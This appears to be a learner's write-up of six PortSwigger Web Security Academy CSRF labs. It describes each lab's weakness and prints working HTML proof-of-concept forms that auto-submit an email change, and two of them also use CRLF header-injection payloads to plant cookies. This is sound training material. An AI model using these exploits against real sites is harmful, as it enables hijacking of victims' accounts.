
# CSRF — Lab: No defenses

- The email-change functionality has **no CSRF defenses**, so an attacker can create an HTML page that automatically submits a POST request to `/my-account/change-email`.
- The CSRF PoC uses a hidden form containing the target endpoint and the attacker's chosen `email` value.
- JavaScript auto-submits the form when the victim opens the exploit page, causing the victim's browser to send the request using their existing authenticated session.
- In Burp Community, the PoC can be created manually instead of using Burp Professional's CSRF PoC generator.
- Upload the HTML to the **Exploit Server**, test it on yourself, change the email so it differs from your own, then **Deliver to victim** to complete the lab.
- HTML template :  < form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" > <input type="hidden" name="email" value="anything@web-security-academy.net"> < /form> < script> document.forms[0].submit(); < /script>


# Lab: CSRF where token validation depends on request method
- This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
- Had to login as wiener and changed my email and viewed the request and response of the activity , had to switch the post method to get method and remove the CSRF token and sent the request 
- Got a 302 response , so created a script to change victim's mail and included a random email id and the exploit was successful
- < form action="https://0a6700db03de285f80205d74006800ab.web-security-academy.net/my-account/change-email">
    < input type="hidden" name="email" value="attacker12fghfgffgfhfghfg34@gmail.com">
  < /form >
  < script >
    document.forms[0].submit();
  < /script >


# Lab: CSRF where token validation depends on token being present
- This lab's email change functionality is vulnerable to CSRF. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
- Logged in as wiener and changed my email and forwarded the requests to repeater , completely removed the CSRF part from the request and sent the request
- The response was 200 , created a script almost the same as the previous lab and was able to exploit and change victim's email 
- < form method="POST" action="https://0a8200e60421255780e649f5008500b5.web-security-academy.net/my-account/change-email">
    < input type="hidden" name="email" value="sid123dfgdfsthsdhHJHUKFHKFG@gmail.com">
  < /form>
  < script>
    document.forms[0].submit();
  < /script>



# Lab: CSRF where token is not tied to user session
- This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
- Had to log in as wiener and carlos both in different tabs , there's a pattern that implied there was a set of CSRF tokens for different events or different phases , meaning user login event had a set of CSRF and only those set of tokens would be allowed , same goes for change of email and next phase after the change of email 
- I was able to replace these CSRF tokens from these accounts and the system allowed it , so i used the same script as above except added an input for CSRF which was retrieved from the response aftermath of changing email from carlos ( i used carlos' account to launch an attack onto weiner' , only wiener' lab url was required)
-  < f orm method="POST" action="https://0a8a00c7034465c88034fd4900c50077.web-security-academy.net/my-account/change-email">
    < input type="hidden" name="email" value="dslfhiowehf@gmail.com">
   < input required type="hidden" name="csrf" value="XJhAQI1BiNWILyjFLcBeUIsnr89u49Nw">
   </ form>
  < script>
        document.forms[0].submit();
    </ script>


# Lab: CSRF where token is tied to non-session cookie
 - This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address
- The CSRF token was not tied to the authenticated session; a token from Carlos could be used successfully with Wiener's session.
- The token was instead associated with a separate `csrfKey` cookie, so the attacker's `csrfKey` also had to be planted in the victim's browser.
- The search functionality reflected the search input into a `Set-Cookie` header, allowing CRLF/header injection with `%0d%0a` to inject `Set-Cookie: csrfKey=YOUR-KEY`.
- The final CSRF exploit first injects the attacker's `csrfKey` using an `<img>` request, then uses `onerror` to submit the CSRF form after the cookie has been set.
- This works because the application validates the CSRF token against the non-session `csrfKey` rather than properly binding it to the victim's session.
- < form method="POST" action="https://0abd008103728ed18090219100f70054.web-security-academy.net/my-account/change-email">
    < input type="hidden" name="email" value="attacker1234@gmail.com">
    < input type="hidden" name="csrf" value="IBfql2EeTcjd6cMIcv1MWfKRlLIMcV55">
< /form>

< img src="https://0abd008103728ed18090219100f70054.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=pmDgCMjloWggIO2fxLBUZaAaw68FdJz6%3b%20SameSite=None" onerror="document.forms[0].submit()">



# Lab: CSRF where token is duplicated in cookie
- This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
-  The application uses the **double-submit cookie** CSRF technique: it compares the `csrf` value in the POST body with the `csrf` cookie.
- The weakness is that the server does **not** properly bind the token to the user's session. We can therefore choose an arbitrary value such as `fake`.
- The search function is vulnerable to **CRLF/header injection**, allowing us to inject `Set-Cookie: csrf=fake` into the victim's browser.
- The exploit first sets the `csrf` cookie using an `<img>` request, then uses `onerror` to submit the CSRF form after the cookie has been set.
- The server receives `csrf=fake` both in the cookie and the POST body, so the comparison succeeds and the victim's email is changed.
- < form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    < input type="hidden" name="email" value="attacker1234@gmail.com">
    < input type="hidden" name="csrf" value="fake">
< /form>

< img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit();">



